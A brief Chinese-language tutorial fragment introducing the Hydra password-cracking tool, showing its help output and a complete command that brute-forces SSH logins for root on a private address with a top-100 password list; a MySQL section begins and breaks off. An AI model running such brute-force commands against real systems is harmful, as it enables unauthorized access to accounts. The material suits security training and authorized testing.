# 0x01 Hydra(九头蛇)
* 命令(一定要学会尝试看英文，因为这是必备技能)
```
PS D:\MyHackTool\Direct\Blasting_dictionary> hydra -hh
...
These services were not compiled in: afp firebird memcached mongodb ncp oracle sapr3 svn smb2.
...
* 爆破`SSH`服务 ---22
```
hydra -vV -l root -P .\top100password.txt -w 1 -t 5 -f -e ns ssh://192.168.10.138
```
* 爆破`Mysql`服务 ---3306
```
